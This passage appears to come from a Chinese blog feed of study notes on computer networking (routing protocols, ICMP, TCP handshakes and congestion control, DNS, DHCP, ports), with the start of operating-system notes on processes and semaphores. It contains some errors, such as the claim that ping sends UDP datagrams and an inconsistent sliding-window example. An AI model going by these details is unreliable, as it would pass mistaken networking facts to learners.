的特定主机路由，则把数据报传送给表中所指明的下一跳路由器； 若路由表中有到达网络 N 的路由，则把数据报传送给路由表中所指明的下一跳路由器； 若路由表中有一个默认路由，则把数据报传送给路由表中所指明的默认路由器； 报告转发分组出错。 路由选择协议互联网使用的路由选择协议都是自适应的，能随着网络通信量和拓扑结构的变化而自适应地进行调整。 互联网可以划分为许多较小的自治系统 AS，一个 AS 可以使用一种和别的 AS 不同的路由选择协议。 可以把路由选择协议划分为两大类： 内部网关协议 IGP（Interior Gateway Protocol）：在 AS 内部使用，如 RIP 和 OSPF。 外部网关协议 EGP（External Gateway Protocol）：在 AS 之间使用，如 BGP。 1. 内部网关协议 RIPRIP 是一种分布式的基于距离向量的路由选择协议。距离是指跳数，直接相连的路由器跳数为 1，跳数最多为 15，超过 15 表示不可达。 RIP 按固定的时间间隔仅和相邻路由器交换自己的路由表，经过若干次交换之后，所有路由器最终会知道到达本自治系统中任何一个网络的最短距离和下一跳路由器地址。 距离向量算法： 对地址为 X 的相邻路由器发来的 RIP 报文，先修改报文中的所有项目，把下一跳字段中的地址改为 X，并把所有的距离字段加 1； 对修改后的 RIP 报文中的每一个项目，进行以下步骤： 若原来的路由表中没有目的网络 N，则把该项目添加到路由表中； 否则：若下一跳路由器地址是 X，则把收到的项目替换原来路由表中的项目；否则：若收到的项目中的距离 d 小于路由表中的距离，则进行更新（例如原始路由表项为 Net2, 5, P，新表项为 Net2, 4, X，则更新）；否则什么也不做。 若 3 分钟还没有收到相邻路由器的更新路由表，则把该相邻路由器标为不可达，即把距离置为 16。 RIP 协议实现简单，开销小，但是 RIP 能使用的最大距离为 15，限制了网络的规模。并且当网络出现故障时，要经过比较长的时间才能将此消息传送到所有路由器。 2. 内部网关协议 OSPF开放最短路径优先 OSPF，是为了克服 RIP 的缺点而开发出来的。 开放表示 OSPF 不受某一家厂商控制，而是公开发表的；最短路径优先表示使用了 Dijkstra 提出的最短路径算法 SPF。 OSPF 具有以下特点： 向本自治系统中的所有路由器发送信息，这种方法是洪泛法。 发送的信息就是与相邻路由器的链路状态，链路状态包括与哪些路由器相连以及链路的度量，度量用费用、距离、时延、带宽等来表示。 只有当链路状态发生变化时，路由器才会发送信息。 所有路由器都具有全网的拓扑结构图，并且是一致的。相比于 RIP，OSPF 的更新过程收敛的很快。 3. 外部网关协议 BGPAS 之间的路由选择很困难，主要是因为互联网规模很大。并且各个 AS 内部使用不同的路由选择协议，就无法准确定义路径的度量。并且 AS 之间的路由选择必须考虑有关的策略，比如有些 AS 不愿意让其它 AS 经过。 BGP 只能寻找一条比较好的路由，而不是最佳路由。它采用路径向量路由选择协议。 每个 AS 都必须配置 BGP 发言人，通过在两个相邻 BGP 发言人之间建立 TCP 连接来交换路由信息。 路由算法分类非自适应算法，静态路由算法路由表固定。简单易行，但适应性差，只适用于负载稳定、拓扑变化不大的网络。 最短路径算法（Dijkstra）： 用 Dijkstra 算法求源点与目的顶点之间的最短路径。 自适应算法，动态路由算法路由表定时刷新。适应能力强，但算法复杂，实现难度大。 距离矢量路由算法（D-V）： 每个节点都定期地测量它到邻节点的距离，然后将它们的路由表传送给所有相邻节点，这里的路由表包含的内容有：每条路径的目的地址、本节点到该目的地址的代价 每个节点根据收到的相邻节点的路由信息，按照最短路径原则更新自己的路由表 缺点：交换的路径信息量大、路径信息不一致、收敛速度慢、不适合大型网络 链路状态路由算法（L-S）： 发现邻居节点，并学习它们的网络地址 测量它到每个邻居节点的延迟或开销 将所有学习到的内容封装成一个分组 将这个分组发送给所有其它路由器 利用静态路由算法计算到每个其它路由器的最短路径 缺点：每个路由器需要有较大的存储空间、计算工作量大 距离矢量路由算法将自己对全网拓扑结构的认识告诉给邻居；链路状态路由算法将自己对邻居的认识泛红给全网。 网际控制报文协议 ICMPICMP 是为了更有效地转发 IP 数据报和提高交付成功的机会。它封装在 IP 数据报中，但是不属于高层协议。 ICMP 报文分为差错报告报文和询问报文。 分组网间探测 PINGPING 是 ICMP 的一个重要应用，主要用来测试两台主机之间的连通性。 Ping 发送的 IP 数据报封装的是无法交付的 UDP 用户数据报。 TracerouteTraceroute 是 ICMP 的另一个应用，用来跟踪一个分组从源点到终点的路径。 源主机向目的主机发送一连串的 IP 数据报。第一个数据报 P1 的生存时间 TTL 设置为 1，当 P1 到达路径上的第一个路由器 R1 时，R1 收下它并把 TTL 减 1，此时 TTL 等于 0，R1 就把 P1 丢弃，并向源主机发送一个 ICMP 时间超过差错报告报文； 源主机接着发送第二个数据报 P2，并把 TTL 设置为 2。P2 先到达 R1，R1 收下后把 TTL 减 1 再转发给 R2，R2 收下后也把 TTL 减 1，由于此时 TTL 等于 0，R2 就丢弃 P2，并向源主机发送一个 ICMP 时间超过差错报文。 不断执行这样的步骤，直到最后一个数据报刚刚到达目的主机，主机不转发数据报，也不把 TTL 值减 1。但是因为数据报封装的是无法交付的 UDP，因此目的主机要向源主机发送 ICMP 终点不可达差错报告报文。 之后源主机知道了到达目的主机所经过的路由器 IP 地址以及到达每个路由器的往返时间。 虚拟专用网 VPN由于 IP 地址的紧缺，一个机构能申请到的 IP 地址数往往远小于本机构所拥有的主机数。并且一个机构并不需要把所有的主机接入到外部的互联网中，机构内的计算机可以使用仅在本机构有效的 IP 地址（专用地址）。 有三个专用地址块： 10.0.0.0 ~ 10.255.255.255 172.16.0.0 ~ 172.31.255.255 192.168.0.0 ~ 192.168.255.255 VPN 使用公用的互联网作为本机构各专用网之间的通信载体。专用指机构内的主机只与本机构内的其它主机通信；虚拟指“好像是”，而实际上并不是，它有经过公用的互联网。 下图中，场所 A 和 B 的通信经过互联网，如果场所 A 的主机 X 要和另一个场所 B 的主机 Y 通信，IP 数据报的源地址是 10.1.0.1，目的地址是 10.2.0.3。数据报先发送到与互联网相连的路由器 R1，R1 对内部数据进行加密，然后重新加上数据报的首部，源地址是路由器 R1 的全球地址 125.1.2.3，目的地址是路由器 R2 的全球地址 194.4.5.6。路由器 R2 收到数据报后将数据部分进行解密，恢复原来的数据报，此时目的地址为 10.2.0.3，就交付给 Y。 网络地址转换 NAT专用网内部的主机使用本地 IP 地址又想和互联网上的主机通信时，可以使用 NAT 来将本地 IP 转换为全球 IP。 在以前，NAT 将本地 IP 和全球 IP 一一对应，这种方式下拥有 n 个全球 IP 地址的专用网内最多只可以同时有 n 台主机接入互联网。为了更有效地利用全球 IP 地址，现在常用的 NAT 转换表把运输层的端口号也用上了，使得多个专用网内部的主机共用一个全球 IP 地址。使用端口号的 NAT 也叫做网络地址与端口转换 NAPT。 五、运输层网络层只把分组发送到目的主机，但是真正通信的并不是主机而是主机中的进程。运输层提供了进程间的逻辑通信，运输层向高层用户屏蔽了下面网络层的核心细节，使应用程序看见的好像在两个运输层实体之间有一条端到端的逻辑通信信道。 UDP 和 TCP 的特点 用户数据报协议 UDP（User Datagram Protocol）是无连接的，尽最大可能交付，没有拥塞控制，面向报文（对于应用程序传下来的报文不合并也不拆分，只是添加 UDP 首部），支持一对一、一对多、多对一和多对多的交互通信。 传输控制协议 TCP（Transmission Control Protocol）是面向连接的，提供可靠交付，有流量控制，拥塞控制，提供全双工通信，面向字节流（把应用层传下来的报文看成字节流，把字节流组织成大小不等的数据块），每一条 TCP 连接只能是点对点的（一对一）。 UDP 首部格式 首部字段只有 8 个字节，包括源端口、目的端口、长度、检验和。12 字节的伪首部是为了计算检验和临时添加的。 TCP 首部格式 序号 ：用于对字节流进行编号，例如序号为 301，表示第一个字节的编号为 301，如果携带的数据长度为 100 字节，那么下一个报文段的序号应为 401。 确认号 ：期望收到的下一个报文段的序号。例如 B 正确收到 A 发送来的一个报文段，序号为 501，携带的数据长度为 200 字节，因此 B 期望下一个报文段的序号为 701，B 发送给 A 的确认报文段中确认号就为 701。 数据偏移 ：指的是数据部分距离报文段起始处的偏移量，实际上指的是首部的长度。 确认 ACK ：当 ACK=1 时确认号字段有效，否则无效。TCP 规定，在连接建立后所有传送的报文段都必须把 ACK 置 1。 同步 SYN ：在连接建立时用来同步序号。当 SYN=1，ACK=0 时表示这是一个连接请求报文段。若对方同意建立连接，则响应报文中 SYN=1，ACK=1。 终止 FIN ：用来释放一个连接，当 FIN=1 时，表示此报文段的发送方的数据已发送完毕，并要求释放连接。 窗口 ：窗口值作为接收方让发送方设置其发送窗口的依据。之所以要有这个限制，是因为接收方的数据缓存空间是有限的。 TCP 的三次握手 假设 A 为客户端，B 为服务器端。 首先 B 处于 LISTEN（监听）状态，等待客户的连接请求。 A 向 B 发送连接请求报文段，SYN=1，ACK=0，选择一个初始的序号 x。 B 收到连接请求报文段，如果同意建立连接，则向 A 发送连接确认报文段，SYN=1，ACK=1，确认号为 x+1，同时也选择一个初始的序号 y。 A 收到 B 的连接确认报文段后，还要向 B 发出确认，确认号为 y+1，序号为 x+1。 B 收到 A 的确认后，连接建立。 三次握手的原因 第三次握手是为了防止失效的连接请求到达服务器，让服务器错误打开连接。 失效的连接请求是指，客户端发送的连接请求在网络中滞留，客户端因为没及时收到服务器端发送的连接确认，因此就重新发送了连接请求。滞留的连接请求并不是丢失，之后还是会到达服务器。如果不进行第三次握手，那么服务器会误认为客户端重新请求连接，然后打开了连接。但是并不是客户端真正打开这个连接，因此客户端不会给服务器发送数据，这个连接就白白浪费了。 TCP 的四次挥手 以下描述不讨论序号和确认号，因为序号和确认号的规则比较简单。并且不讨论 ACK，因为 ACK 在连接建立之后都为 1。 A 发送连接释放报文段，FIN=1。 B 收到之后发出确认，此时 TCP 属于半关闭状态，B 能向 A 发送数据但是 A 不能向 B 发送数据。 当 B 不再需要连接时，发送连接释放请求报文段，FIN=1。 A 收到后发出确认，进入 TIME-WAIT 状态，等待 2 MSL 时间后释放连接。 B 收到 A 的确认后释放连接。 四次挥手的原因 客户端发送了 FIN 连接释放报文之后，服务器收到了这个报文，就进入了 CLOSE-WAIT 状态。这个状态是为了让服务器端发送还未传送完毕的数据，传送完毕之后，服务器会发送 FIN 连接释放报文。 TIME_WAIT 客户端接收到服务器端的 FIN 报文后进入此状态，此时并不是直接进入 CLOSED 状态，还需要等待一个时间计时器设置的时间 2MSL。这么做有两个理由： 确保最后一个确认报文段能够到达。如果 B 没收到 A 发送来的确认报文段，那么就会重新发送连接释放请求报文段，A 等待一段时间就是为了处理这种情况的发生。 等待一段时间是为了让本连接持续时间内所产生的所有报文段都从网络中消失，使得下一个新的连接不会出现旧的连接请求报文段。 TCP 滑动窗口 窗口是缓存的一部分，用来暂时存放字节流。发送方和接收方各有一个窗口，接收方通过 TCP 报文段中的窗口字段告诉发送方自己的窗口大小，发送方根据这个值和其它信息设置自己的窗口大小。 发送窗口内的字节都允许被发送，接收窗口内的字节都允许被接收。如果发送窗口左部的字节已经发送并且收到了确认，那么就将发送窗口向右滑动一定距离，直到左部第一个字节不是已发送并且已确认的状态；接收窗口的滑动类似，接收窗口左部字节已经发送确认并交付主机，就向右滑动接收窗口。 接收窗口只会对窗口内最后一个按序到达的字节进行确认，例如接收窗口已经收到的字节为 {31, 33, 34}，其中 {31} 按序到达，而 {32, 33} 就不是，因此只对字节 31 进行确认。发送方得到一个字节的确认之后，就知道这个字节之前的所有字节都已经被接收。 TCP 可靠传输TCP 使用超时重传来实现可靠传输：如果一个已经发送的报文段在超时时间内没有收到确认，那么就重传这个报文段。 一个报文段从发送再到接收到确认所经过的时间称为往返时间 RTT，加权平均往返时间 RTTs 计算如下： 超时时间 RTO 应该略大于 RTTs，TCP 使用的超时时间计算如下： 其中 RTTd 为偏差。 TCP 流量控制流量控制是为了控制发送方发送速率，保证接收方来得及接收。 接收方发送的确认报文中的窗口字段可以用来控制发送方窗口大小，从而影响发送方的发送速率。将窗口字段设置为 0，则发送方不能发送数据。 TCP 拥塞控制如果网络出现拥塞，分组将会丢失，此时发送方会继续重传，从而导致网络拥塞程度更高。因此当出现拥塞时，应当控制发送方的速率。这一点和流量控制很像，但是出发点不同。流量控制是为了让接收方能来得及接受，而拥塞控制是为了降低整个网络的拥塞程度。 TCP 主要通过四种算法来进行拥塞控制：慢开始、拥塞避免、快重传、快恢复。 发送方需要维护一个叫做拥塞窗口（cwnd）的状态变量，注意拥塞窗口与发送方窗口的区别：拥塞窗口只是一个状态变量，实际决定发送方能发送多少数据的是发送方窗口。 为了便于讨论，做如下假设： 接收方有足够大的接收缓存，因此不会发生流量控制； 虽然 TCP 的窗口基于字节，但是这里设窗口的大小单位为报文段。 1. 慢开始与拥塞避免发送的最初执行慢开始，令 cwnd=1，发送方只能发送 1 个报文段；当收到确认后，将 cwnd 加倍，因此之后发送方能够发送的报文段数量为：2、4、8 … 注意到慢开始每个轮次都将 cwnd 加倍，这样会让 cwnd 增长速度非常快，从而使得发送方发送的速度增长速度过快，网络拥塞的可能也就更高。设置一个慢开始门限 ssthresh，当 cwnd &gt;= ssthresh 时，进入拥塞避免，每个轮次只将 cwnd 加 1。 如果出现了超时，则令 ssthresh = cwnd/2，然后重新执行慢开始。 2. 快重传与快恢复在接收方，要求每次接收到报文段都应该发送对已收到有序报文段的确认，例如已经接收到 M1 和 M2，此时收到 M4，应当发送对 M2 的确认。 在发送方，如果收到三个重复确认，那么可以确认下一个报文段丢失，例如收到三个 M2 ，则 M3 丢失。此时执行快重传，立即重传下一个报文段。 在这种情况下，只是丢失个别报文段，而不是网络拥塞，因此执行快恢复，令 ssthresh = cwnd/2 ，cwnd = ssthresh，注意到此时直接进入拥塞避免。 六、应用层域名系统 DNS把主机名解析为 IP 地址。 被设计成分布式系统。 1. 层次结构一个域名由多个层次构成，从上层到下层分别为顶级域名、二级域名、三级域名以及四级域名。所有域名可以画成一颗域名树。 域名服务器可以分为以下四类： 根域名服务器：解析顶级域名； 顶级域名服务器：解析二级域名； 权限域名服务器：解析区内的域名； 本地域名服务器：也称为默认域名服务器。可以在其中配置高速缓存。 区和域的概念不同，可以在一个域中划分多个区。图 b 在域 abc.com 中划分了两个区：abc.com 和 y.abc.com 因此就需要两个权限域名服务器： 2. 解析过程主机向本地域名服务器解析的过程采用递归，而本地域名服务器向其它域名服务器解析可以使用递归和迭代两种方式。 迭代的方式下，本地域名服务器向一个域名服务器解析请求解析之后，结果返回到本地域名服务器，然后本地域名服务器继续向其它域名服务器请求解析；而递归的方式下，结果不是直接返回的，而是继续向前请求解析，最后的结果才会返回。 3. 使用的运输层协议DNS 在解析的过程使用 UDP 进行传输，因为 UDP 最大只支持 512 字节的数据，如果超过的话就需要使用 TCP 传输。 文件传输协议 FTPFTP 在运输层使用 TCP，并且需要建立两个并行的 TCP 连接：控制连接和数据连接。控制连接在整个会话期间一直保持打开，而数据连接在数据传送完毕之后就关闭。控制连接使用端口号 21，数据连接使用端口号 20。 远程终端协议 TELNETTELNET 用于登录到远程主机上，并且远程主机上的输出也会返回。 TELNET 可以适应许多计算机和操作系统的差异，例如不同操作系统系统的换行符定义。 电子邮件协议一个电子邮件系统由三部分组成：用户代理、邮件服务器以及邮件发送协议和读取协议。其中发送协议常用 SMTP，读取协议常用 POP3 和 IMAP。 1. POP3POP3 的特点是只要用户从服务器上读取了邮件，就把该邮件删除。 2. IMAPIMAP 协议中客户端和服务器上的邮件保持同步，如果不去手动删除邮件，那么服务器上的邮件也不会被删除。IMAP 这种做法可以让用户随时随地去访问服务器上的邮件。IMAP 协议也支持创建自定义的文件夹。 3. SMTPSMTP 只能发送 ASCII 码，而互联网邮件扩充 MIME 可以发送二进制文件。MIME 并没有改动或者取代 SMTP，而是增加邮件主体的结构，定义了非 ASCII 码的编码规则。 动态主机配置协议 DHCPDHCP 提供了即插即用的连网方式，用户不再需要去手动配置 IP 地址等信息。 DHCP 配置的内容不仅是 IP 地址，还包括子网掩码、默认路由器 IP 地址、域名服务器的 IP 地址。 工作方式如下：需要 IP 地址的主机广播发送 DHCP 发现报文（将目的地址置为全 1，即 255.255.255.255:67，源地址设置为全 0，即 0.0.0.0:68），DHCP 服务器收到发现报文之后，则在 IP 地址池中取一个地址，发送 DHCP 提供报文给该主机。 点对点传输 P2P把某个文件分发的所有对等集合称为一个洪流。文件的数据单元称为文件块，它的大小是固定的。一个新的对等方加入某个洪流，一开始并没有文件块，但是能够从其它对等方中逐渐地下载到一些文件块，与此同时，它也为别的对等方上传一些文件块。 每个洪流都有一个基础设施，称为追踪器。当一个对等方加入洪流时，必须向追踪器登记，并周期性地通知追踪器它仍在洪流中。可以在任何时间加入和退出某个洪流。 一个新的对等方加入洪流时，追踪器会随机从洪流中选择若干个对等方，并让新对等方与这些对等方建立连接，把这些对等方称为相邻对等方。接收和发送文件块都是在相邻对等方中进行。 当一个对等方需要很多文件块时，通过使用最稀有优先的策略来取得文件块，也就是一个文件块在相邻对等方中副本最少，那么就优先请求这个文件块。 当很多对等方向同一个对等方请求文件块时，该对等方优先选择以最高速率向其发送文件块的对等方。 P2P 是一个分布式系统，任何时候都有对等方加入或者退出。使用分布式散列表 DHT，可以查找洪流中的资源和 IP 地址映射。 Web 页面请求过程1. DHCP 配置主机信息 假设主机最开始没有 IP 地址以及其它信息，那么就需要先使用 DHCP 来获取。 主机生成一个 DHCP 请求报文，并将这个报文放入具有目的端口 67 和源端口 68 的 UDP 报文段中。 该报文段则被放入在一个具有广播 IP 目的地址(255.255.255.255) 和源 IP 地址（0.0.0.0）的 IP 数据报中。 该数据报则被放置在 MAC 帧中，该帧具有目的地址 FF:FF:FF:FF:FF:FF，将广播到与交换机连接的所有设备。 连接在交换机的 DHCP 服务器收到广播帧之后，不断地向上分解得到 IP 数据报、UDP 报文段、DHCP 请求报文，之后生成 DHCP ACK 报文，该报文包含以下信息：IP 地址、DNS 服务器的 IP 地址、默认网关路由器的 IP 地址和子网掩码。该报文被放入 UDP 报文段中，UDP 报文段有被放入 IP 数据报中，最后放入 MAC 帧中。 该帧的目的地址是请求主机的 MAC 地址，因为交换机具有自学习能力，之前主机发送了广播帧之后就记录了 MAC 地址到其转发接口的交换表项，因此现在交换机就可以直接知道应该向哪个接口发送该帧。 主机收到该帧后，不断分解得到 DHCP 报文。之后就配置它的 IP 地址、子网掩码和 DNS 服务器的 IP 地址，并在其 IP 转发表中安装默认网关。 2. ARP 解析 MAC 地址 主机通过浏览器生成一个 TCP 套接字，套接字向 HTTP 服务器发送 HTTP 请求。为了生成该套接字，主机需要知道网站的域名对应的 IP 地址。 主机生成一个 DNS 查询报文，该报文具有 53 号端口，因为 DNS 服务器的端口号是 53。 该 DNS 查询报文被放入目的地址为 DNS 服务器 IP 地址的 IP 数据报中。 该 IP 数据报被放入一个以太网帧中，该帧将发送到网关路由器。 DHCP 过程只知道网关路由器的 IP 地址，为了获取网关路由器的 MAC 地址，需要使用 ARP 协议。 主机生成一个包含目的地址为网关路由器 IP 地址的 ARP 查询报文，将该 ARP 查询报文放入一个具有广播目的地址（FF:FF:FF:FF:FF:FF）的以太网帧中，并向交换机发送该以太网帧，交换机将该帧转发给所有的连接设备，包括网关路由器。 网关路由器接收到该帧后，不断向上分解得到 ARP 报文，发现其中的 IP 地址与其接口的 IP 地址匹配，因此就发送一个 ARP 回答报文，包含了它的 MAC 地址，发回给主机。 3. DNS 解析域名 知道了网关路由器的 MAC 地址之后，就可以继续 DNS 的解析过程了。 网关路由器接收到包含 DNS 查询报文的以太网帧后，抽取出 IP 数据报，并根据转发表决定该 IP 数据报应该转发的路由器。 因为路由器具有内部网关协议（RIP、OSPF）和外部网关协议（BGP）这两种路由选择协议，因此路由表中已经配置了网关路由器到达 DNS 服务器的路由表项。 到达 DNS 服务器之后，DNS 服务器抽取出 DNS 查询报文，并在 DNS 数据库中查找待解析的域名。 找到 DNS 记录之后，发送 DNS 回答报文，将该回答报文放入 UDP 报文段中，然后放入 IP 数据报中，通过路由器反向转发回网关路由器，并经过以太网交换机到达主机。 4. HTTP 请求页面 有了 HTTP 服务器的 IP 地址之后，主机就能够生成 TCP 套接字，该套接字将用于向 Web 服务器发送 HTTP GET 报文。 在生成 TCP 套接字之前，必须先与 HTTP 服务器进行三次握手来建立连接。生成一个具有目的端口 80 的 TCP SYN 报文段，并向 HTTP 服务器发送该报文段。 HTTP 服务器收到该报文段之后，生成 TCP SYN ACK 报文段，发回给主机。 连接建立之后，浏览器生成 HTTP GET 报文，并交付给 HTTP 服务器。 HTTP 服务器从 TCP 套接字读取 HTTP GET 报文，生成一个 HTTP 响应报文，将 Web 页面内容放入报文主体中，发回给主机。 浏览器收到 HTTP 响应报文后，抽取出 Web 页面内容，之后进行渲染，显示 Web 页面。 常用端口 应用 应用层协议 端口号 运输层协议 备注 域名解析 DNS 53 UDP/TCP 长度超过 512 字节时使用 TCP 动态主机配置协议 DHCP 67/68 UDP 简单网络管理协议 SNMP 161/162 UDP 文件传送协议 FTP 20/21 TCP 控制连接 21，数据连接 20 远程终端协议 TELNET 23 TCP 超文本传送协议 HTTP 80 TCP 简单邮件传送协议 SMTP 25 TCP 邮件读取协议 POP3 110 TCP 网际报文存取协议 IMAP 143 TCP 参考资料 计算机网络]]></content>
      <tags>
        <tag>计算机网络及其他</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算机操作系统]]></title>
    <url>%2F2018%2F07%2F21%2F%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[本篇讲述计算机操作系统。 一、概述操作系统基本特征1. 并发并发是指宏观上在一段时间内能同时运行多个程序，而并行则指同一时刻能运行多个指令。 并行需要硬件支持，如多流水线或者多处理器。 操作系统通过引入进程和线程，使得程序能够并发运行。 2. 共享共享是指系统中的资源可以被多个并发进程共同使用。 有两种共享方式：互斥共享和同时共享。 互斥共享的资源称为临界资源，例如打印机等，在同一时间只允许一个进程访问，需要用同步机制来实现对临界资源的访问。 3. 虚拟虚拟技术把一个物理实体转换为多个逻辑实体。 主要有两种虚拟技术：时分复用技术和空分复用技术。例如多个进程能在同一个处理器上并发执行使用了时分复用技术，让每个进程轮流占有处理器，每次只执行一小个时间片并快速切换。 4. 异步异步指进程不是一次性执行完毕，而是走走停停，以不可知的速度向前推进。 操作系统基本功能1. 进程管理进程控制、进程同步、进程通信、死锁处理、处理机调度等。 2. 内存管理内存分配、地址映射、内存保护与共享、虚拟内存等。 3. 文件管理文件存储空间的管理、目录管理、文件读写管理和保护等。 4. 设备管理完成用户的 I/O 请求，方便用户使用各种设备，并提高设备的利用率。 主要包括缓冲管理、设备分配、设备处理、虛拟设备等。 系统调用如果一个进程在用户态需要使用内核态的功能，就进行系统调用从而陷入内核，由操作系统代为完成。 Linux 的系统调用主要有以下这些： Task Commands 进程控制 fork(); exit(); wait(); 进程通信 pipe(); shmget(); mmap(); 文件操作 open(); read(); write(); 设备操作 ioctl(); read(); write(); 信息维护 getpid(); alarm(); sleep(); 安全 chmod(); umask(); chown(); 大内核和微内核1. 大内核大内核是将操作系统功能作为一个紧密结合的整体放到内核。 由于各模块共享信息，因此有很高的性能。 2. 微内核由于操作系统不断复杂，因此将一部分操作系统功能移出内核，从而降低内核的复杂性。移出的部分根据分层的原则划分成若干服务，相互独立。 在微内核结构下，操作系统被划分成小的、定义良好的模块，只有微内核这一个模块运行在内核态，其余模块运行在用户态。 因为需要频繁地在用户态和核心态之间进行切换，所以会有一定的性能损失。 中断分类1. 外中断由 CPU 执行指令以外的事件引起，如 I/O 结束中断，表示设备输入/输出处理已经完成，处理器能够发送下一个输入/输出请求。此外还有时钟中断、控制台中断等。 2. 异常由 CPU 执行指令的内部事件引起，如非法操作码、地址越界、算术溢出等。 3. 陷入在用户程序中使用系统调用。 二、进程管理进程与线程1. 进程进程是资源分配的基本单位。 进程控制块 (Process Control Block, PCB) 描述进程的基本信息和运行状态，所谓的创建进程和撤销进程，都是指对 PCB 的操作。 下图显示了 4 个程序创建了 4 个进程，这 4 个进程可以并发地执行。 2. 线程线程是独立调度的基本单位。 一个进程中可以有多个线程，它们共享进程资源。 3. 区别 拥有资源：进程是资源分配的基本单位，但是线程不拥有资源，线程可以访问隶属进程的资源。 调度：线程是独立调度的基本单位，在同一进程中，线程的切换不会引起进程切换，从一个进程内的线程切换到另一个进程中的线程时，会引起进程切换。 系统开销：由于创建或撤销进程时，系统都要为之分配或回收资源，如内存空间、I/O 设备等，所付出的开销远大于创建或撤销线程时的开销。类似地，在进行进程切换时，涉及当前执行进程 CPU 环境的保存及新调度进程 CPU 环境的设置，而线程切换时只需保存和设置少量寄存器内容，开销很小。 通信方面：进程间通信 (IPC) 需要进程同步和互斥手段的辅助，以保证数据的一致性。而线程间可以通过直接读/写同一进程中的数据段（如全局变量）来进行通信。 举例：QQ 和浏览器是两个进程，浏览器进程里面有很多线程，例如 HTTP 请求线程、事件响应线程、渲染线程等等，线程的并发执行使得在浏览器中点击一个新链接从而发起 HTTP 请求时，浏览器还可以响应用户的其它事件。 进程状态的切换 就绪状态（ready）：等待被调度 运行状态（running） 阻塞状态（waiting）：等待资源 应该注意以下内容： 只有就绪态和运行态可以相互转换，其它的都是单向转换。就绪状态的进程通过调度算法从而获得 CPU 时间，转为运行状态；而运行状态的进程，在分配给它的 CPU 时间片用完之后就会转为就绪状态，等待下一次调度。 阻塞状态是缺少需要的资源从而由运行状态转换而来，但是该资源不包括 CPU 时间，缺少 CPU 时间会从运行态转换为就绪态。 调度算法需要针对不同环境来讨论调度算法。 1. 批处理系统中的调度（一）先来先服务 first-come first-serverd（FCFS） 调度最先进入就绪队列的作业。 有利于长作业，但不利于短作业，因为短作业必须一直等待前面的长作业执行完毕才能执行，而长作业又需要执行很长时间，造成了短作业等待时间过长。 （二）短作业优先 shortest job first（SJF） 调度估计运行时间最短的作业。 长作业有可能会饿死，处于一直等待短作业执行完毕的状态。因为如果一直有短作业到来，那么长作业永远得不到调度。 （三）最短剩余时间优先 shortest remaining time next（SRTN） 2. 交互式系统中的调度（一）优先级调度 除了可以手动赋予优先权之外，还可以把响应比作为优先权，这种调度方式叫做高响应比优先调度算法。 响应比 = (等待时间 + 要求服务时间) / 要求服务时间 = 响应时间 / 要求服务时间 这种调度算法主要是为了解决短作业优先调度算法长作业可能会饿死的问题，因为随着等待时间的增长，响应比也会越来越高。 （二）时间片轮转 将所有就绪进程按 FCFS 的原则排成一个队列，每次调度时，把 CPU 时间分配给队首进程，该进程可以执行一个时间片。当时间片用完时，由计时器发出时钟中断，调度程序便停止该进程的执行，并将它送往就绪队列的末尾，同时继续把 CPU 时间分配给队首的进程。 时间片轮转算法的效率和时间片的大小有很大关系。因为进程切换都要保存进程的信息并且载入新进程的信息，如果时间片太小，会导致进程切换得太频繁，在进程切换上就会花过多时间。 （三）多级反馈队列 如果一个进程需要执行 100 个时间片，如果采用轮转调度算法，那么需要交换 100 次。多级队列是为这种需要连续执行多个时间片的进程考虑，它设置了多个队列，每个队列时间片大小都不同，例如 1,2,4,8,..。进程在第一个队列没执行完，就会被移到下一个队列。这种方式下，之前的进程只需要交换 7 次。 每个队列优先权也不同，最上面的优先权最高。因此只有上一个队列没有进程在排队，才能调度当前队列上的进程。 3. 实时系统中的调度实时系统要求一个服务请求在一个确定时间内得到响应。 分为硬实时和软实时，前者必须满足绝对的截止时间，后者可以容忍一定的超时。 进程同步1. 临界区对临界资源进行访问的那段代码称为临界区。 为了互斥访问临界资源，每个进程在进入临界区之前，需要先进行检查。 123// entry section// critical section;// exit section 2. 同步与互斥 同步：多个进程按一定顺序执行； 互斥：多个进程在同一时刻只有一个进程能进入临界区。 3. 信号量信号量（Semaphore）是一个整型变量，可以对其执行 down 和 up 操作，也就是常见的 P 和 V 操作。 down : 如果信号量大于 0 ，执行 -1 操作；如果信号量等于 0，进程睡眠，等待信号量大于 0； up ：对信号量执行 +1 操作，唤醒睡眠的进程让其完成 down 操作。 down 和 up 操作需要被设计成原语，不可分割，通常的做法是在执行这些操作的时候屏蔽中断。 如果信号量的取值只能为 0 或者 1，那么就成为了 互斥量（Mutex） ，0 表示临界区已经加锁，1 表示临界区解锁。 12345678910111213typedef int semaphore;semaphore mutex = 1;void P1() &#123; down(&amp;mutex); // 临界区 up(&amp;mutex);&#125;void P2() &#123; down(&amp;mutex); // 临界区 up(&amp;mutex);&#125; 使用信号量实现生产者-消费者问题 问题描述：使用一个缓冲区来保存物品，只有缓冲区没有满，生产者才可以放入物品；只有缓冲区不为空，消费者才可以拿走物品。 因为缓冲区属于临界资源，因此需要使用一个互斥量 mutex 来控制对缓冲区的互斥访问。 为了同步生产者和消费者的行为，需要记录缓冲区中物品的数量。数量可以使用信号量来进行统计，这里需要使用两个信号量：empty 记录空缓冲区的数量，full 记录满缓冲区的数量。其中，empty 信号量是在生产者进程中使用，当 empty 不为 0 时，生产者才可以放入物品；full 信号量是在消费者进程中使用，当 full 信号量不为 0 时，消费者才可以取走物品。 注意，不能先对缓冲区进行加锁，再测试信号量。也就是说，不能先执行 down(mutex) 再执行 down(empty)。如果这么做了，那么可能会出现这种情况：生产者对缓冲区加锁后，执行 down(empty) 操作，发现 empty = 0，此时生产者睡眠。消费者不能进入临界区，因为生产者对缓冲区加锁了，也就无法执行 up(empty) 操作，empty 永远都为 0，那么生产者和消费者就会一直等待下去，造成死锁。 123456789101112131415161718192021222324252627#define N 100typedef int semaphore;semaphore mutex = 1;semaphore empty = N;semaphore full = 0;void producer() &#123; while(TRUE)&#123; int item = produce_item(); down(&amp;empty); down(&amp;mutex); insert_item(item); up(&amp;mutex); up(&amp;full); &#125;&#125;void consumer() &#123; while(TRUE)&#123; down(&amp;full); down(&amp;mutex); int item = remove_item(); up(&amp;mutex); up(&amp;empty); consume_item(item); &#125;&#125; 4. 管程使用信号量机制实现的生产者消费者问题需要客户端代码做很多控制，而管程把控制的代码独立出来，不仅不容易出错，也使得客户端代码调用更容易。 c 语言不支持管程，下面的示例代码使用了类 Pascal 语言来描述管程。示例代码的管程提供了 